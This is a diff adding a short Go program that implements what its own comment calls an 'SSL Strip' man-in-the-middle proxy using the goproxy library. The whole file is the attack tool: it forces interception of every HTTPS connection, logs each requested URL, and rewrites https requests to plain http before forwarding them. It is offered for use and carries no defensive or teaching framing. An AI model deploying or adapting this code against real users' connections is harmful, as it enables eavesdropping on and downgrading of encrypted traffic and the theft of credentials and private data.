@@ -1,0 +1,25 @@
+package main
+
+import (
+	"fmt"
+	"gopkg.in/elazarl/goproxy.v1"
+	"log"
+	"net/http"
+)
+
+func main() {
+	// Implement SSL Strip - MITM using Goproxy
+	fmt.Println("Server staring")
+
+	proxy := goproxy.NewProxyHttpServer()
+	proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
+	proxy.OnRequest().DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
+		fmt.Println("Request: ", req.URL.String())
+		if req.URL.Scheme == "https" {
+			req.URL.Scheme = "http"
+		}
+		return req, nil
+	})
+	proxy.Verbose = true
+	log.Fatal(http.ListenAndServe("localhost:7080", proxy))
+}
